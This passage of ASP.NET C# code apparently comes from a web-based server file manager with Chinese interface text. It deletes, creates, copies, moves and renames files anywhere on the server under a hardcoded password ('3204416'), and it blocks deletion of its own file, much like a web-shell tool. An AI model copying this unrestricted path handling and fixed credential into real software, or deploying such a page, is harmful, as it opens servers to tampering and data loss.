			string TempPath = Path.Combine(FolderPath.Value,CurrentFile.Value);
			TempPath = Server.UrlDecode(Server.UrlEncode(TempPath).Replace("%c2%a0","+"));
			if(TempPath == Path.Combine(Server.MapPath("."),GetFileName())){
				Response.Write("<script language=javascript>alert('提示信息：不准碰我!!!>:-<');<"+"/script>");
				return;
			}
			if(File.Exists(TempPath))
			{
				try
				{
					File.Delete(TempPath);
					Response.Write("<script language=javascript>alert('文件已经删除！');<"+"/script>");
					DisplayList(FolderPath.Value);
					return;				
				}
				catch(Exception ex)
				{
					ErrorText.Text = ex.Message;
				}
			}
			else
			{
				//Response.Write(TempPath);
				Response.Write("<script language=javascript>alert('没有发现目标文件，操作失败！');<"+"/script>");
				return;
			}
		}
		/// <summary>
		/// 删除文件夹。
		/// </summary>
		private void Button6_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			string TempPath = Path.Combine(FolderPath.Value,CurrentFolder.Value);
			TempPath = Server.UrlDecode(Server.UrlEncode(TempPath).Replace("%c2%a0","+"));
			if(Directory.Exists(TempPath))
			{
				try
				{
					Directory.Delete(TempPath);
					Response.Write("<script language=javascript>alert('文件夹已经删除！');<"+"/script>");
					DisplayList(FolderPath.Value);
					return;				
				}
				catch(Exception ex)
				{
					ErrorText.Text = ex.Message;
					return;
				}
			}
			else
			{
				Response.Write("<script language=javascript>alert('没有发现目标文件夹，操作失败！');<"+"/script>");
				return;
			}
		}
		/// <summary>
		/// 创建文件。
		/// </summary>
		private void Button1_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			try{
			File.CreateText(Path.Combine(FolderPath.Value,TextBox2.Text.ToString()));
			}
			catch(Exception ex)
			{
				ErrorText.Text = ex.Message;
				return;
			}
			Response.Write("<script language=javascript>alert('文件已经创建！');<"+"/script>");
			TextBox2.Text = "";
			DisplayList(FolderPath.Value);
			return;
		}
		/// <summary>
		/// 删除文件夹。
		/// </summary>
		private void Button2_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			try{
			Directory.CreateDirectory(Path.Combine(FolderPath.Value,TextBox2.Text.ToString()));
			}
			catch(Exception ex)
			{
				ErrorText.Text = ex.Message;
				return;
			}
			Response.Write("<script language=javascript>alert('文件夹已经创建！');<"+"/script>");
			TextBox2.Text = "";
			DisplayList(FolderPath.Value);
			return;
		}
		/// <summary>
		/// 复制文件或文件夹。
		/// </summary>
		private void Button7_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			string TempPath="";
			if(CurrentFile.Value != "")
			{
				TempPath = Path.Combine(FolderPath.Value,CurrentFile.Value);
				Session["Type"] = "File";
			}
			else if(CurrentFolder.Value != "")
			{
				TempPath = Path.Combine(FolderPath.Value,CurrentFolder.Value);
				Session["Type"] = "Folder";
			}	
			TempPath = Server.UrlDecode(Server.UrlEncode(TempPath).Replace("%c2%a0","+"));
			Session["CutBoard"] = TempPath;
			Session["Action"] = "copy";	
			Button9.Enabled = true;
			return;
		}
		/// <summary>
		/// 剪切文件或文件夹。
		/// </summary>
		private void Button8_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			string TempPath="";
			if(CurrentFile.Value != "")
			{
				TempPath = Path.Combine(FolderPath.Value,CurrentFile.Value);
				Session["Type"] = "File";
			}
			else if(CurrentFolder.Value != "")
			{
				TempPath = Path.Combine(FolderPath.Value,CurrentFile.Value);
				Session["Type"] = "Folder";
			}
			TempPath = Server.UrlDecode(Server.UrlEncode(TempPath).Replace("%c2%a0","+"));
			Session["CutBoard"] = TempPath;
			Session["Action"] = "cut";		
			Button9.Enabled = true;
			return;
		}
		/// <summary>
		/// 粘贴文件或文件夹。
		/// </summary>
		private void Button9_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			try
			{
			if(Session["CutBoard"].ToString() != "")
			{
				char[] de = {'\\'};
				string[] TempArray = Session["CutBoard"].ToString().Split(de);
				if(Session["Type"].ToString() == "File"){
					if(Session["Action"].ToString() == "copy"){	File.Copy(Session["CutBoard"].ToString(),FolderPath.Value+@"\"+TempArray[TempArray.Length-1]);
					}
					else{	File.Move(Session["CutBoard"].ToString(),FolderPath.Value+@"\"+TempArray[TempArray.Length-1]);
					}
				}
				else if(Session["Type"].ToString() == "Folder"){
					if(Session["Action"].ToString() == "copy")
					{	copyDirectory(Session["CutBoard"].ToString(),FolderPath.Value+@"\"+TempArray[TempArray.Length-1]);
					}
					else{	Directory.Move(Session["CutBoard"].ToString(),FolderPath.Value+@"\"+TempArray[TempArray.Length-1]);
					}
				}
				DisplayList(FolderPath.Value);
				return;
			}}
			catch(Exception ex)
			{
				ErrorText.Text = ex.Message;
				return;
			}
		}
		/// <summary>
		/// 复制文件夹。
		/// </summary>
		private void copyDirectory(string Src,string Dst)
		{
			if(!Chk_Purview())return;
			String[] Files;
			if(Dst[Dst.Length-1]!=Path.DirectorySeparatorChar) Dst+=Path.DirectorySeparatorChar;
			if(!Directory.Exists(Dst)) Directory.CreateDirectory(Dst);
			Files=Directory.GetFileSystemEntries(Src);
			foreach(string Element in Files)
			{
				// Sub directories
				if(Directory.Exists(Element)) copyDirectory(Element,Dst+Path.GetFileName(Element));
				// Files in directory
				else File.Copy(Element,Dst+Path.GetFileName(Element),true);
			}
		}
		/// <summary>
		/// 登录系统。
		/// </summary>
		private void Button12_Click(object sender, System.EventArgs e)
		{
			if(Session["admin"] == null)
			{	Button13.Attributes.Add("onclick","if(form2.TextBox3.value==''){alert('请输入密码！');TextBox3.focus();return false;}");
				TextBox3.Attributes.Add("onkeypress","if(event.keyCode == 13){form2.Button13.click();return false;}");
				TextBox3.Visible = true;
				Button13.Visible = true;
				Button12.Visible = false;
				return;
			}
			else{
				Session["admin"] = null;Button10.Visible = false;Button11.Visible = false;
				Button3.Visible = false;Button5.Visible = false;Button6.Visible = false;
				Button7.Visible = false;Button8.Visible = false;Button9.Visible = false;
				Button14.Visible = false;edit.Style.Add("display","none");Button12.Text = "登录系统";
				return;
			}
		}
		/// <summary>
		/// 验证用户。
		/// </summary>
		private void Button13_Click(object sender, System.EventArgs e)
		{
			//设置登录密码
			string pass = "3204416";
			if(TextBox3.Text == pass){
				Session["admin"] = pass;Button12.Text = "退出登录";Button10.Visible = true;
				Button11.Visible = true;Button5.Visible = true;Button6.Visible = true;
				Button7.Visible = true;Button8.Visible = true;Button9.Visible = true;
				Button7.Enabled = false;Button8.Enabled = false;Button9.Enabled = false;
				Button14.Visible = true;Button3.Visible = true;edit.Style.Add("display","");
				return;
			}
			else{
				ErrorText.Text = "密码错误，登录失败！";
				return;
			}
		}
		/// <summary>
		///文件或文件夹重命名。
		/// </summary>
		private void Button15_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			try{
			string OldPath="",NewPath="";
			if(CurrentFile.Value != "")
			{
				OldPath = Path.Combine(FolderPath.Value,CurrentFile.Value);
				OldPath = Server.UrlDecode(Server.UrlEncode(OldPath).Replace("%c2%a0","+"));
				NewPath = Path.Combine(FolderPath.Value,TextBox4.Text);
				File.Move(OldPath,NewPath);
			}
			else if(CurrentFolder.Value != "")
			{
				OldPath = Path.Combine(FolderPath.Value,CurrentFolder.Value);
				OldPath = Server.UrlDecode(Server.UrlEncode(OldPath).Replace("%c2%a0","+"));
				NewPath = Path.Combine(FolderPath.Value,TextBox4.Text);
				Directory.Move(OldPath,NewPath);
			}
			}
			catch(Exception ex){
				ErrorText.Text = ex.Message;
				return;
				}
			DisplayList(FolderPath.Value);
			Response.Write("<script language=javascript>alert('重命名成功！');<"+"/script>");
			return;
		}
		private bool Chk_Purview()
		{
			bool log;
			if(Session["admin"] == null || Session["admin"] == ""){
				Response.Write("<script language=javascript>alert('还未登录或操作已超时！');<"+"/script>");
				log = false;				
			}
			else
			log = true;
			return log;
		}
		#endregion

		#region Initialize Buttons Click

		/// <summary>
		/// 初始化上传。
		/// </summary>
		private void Button10_Click(object sender, System.EventArgs e)	
		{
			if(!Chk_Purview())return;
			UploadFile.Style.Add("display","");Button4.Visible = true;Button10.Visible = false;
			return;
		}
		/// <summary>
		/// 初始化新建。。。
		/// </summary>
		private void Button11_Click(object sender, System.EventArgs e)
		{	
			if(!Chk_Purview())return;	Button1.Attributes.Add("onclick","if(form2.TextBox2.value==''){alert('请输入文件名！');TextBox2.focus();return false;}");			Button2.Attributes.Add("onclick","if(form2.TextBox2.value==''){alert('请输入文件夹名！');TextBox2.focus();return false;}");
			TextBox2.Visible = true;Button1.Visible = true;Button2.Visible = true;Button11.Visible = false;
			return;
		}
		/// <summary>
		///初始化重命名。
		/// </summary>
		private void Button14_Click(object sender, System.EventArgs e)
		{
			if(!Chk_Purview())return;
			Button15.Attributes.Add("onclick","if(form2.CurrentFile.value=='' && form2.CurrentFolder.value==''){alert('请选取一个文件或文件名！');return false;}if(form2.TextBox4.value==''){alert('请输入新文件名或文件夹名！');TextBox4.focus();return false;}");
			TextBox4.Visible = true;Button15.Visible = true;Button14.Visible = false;
			return;
		}
		#endregion
</script>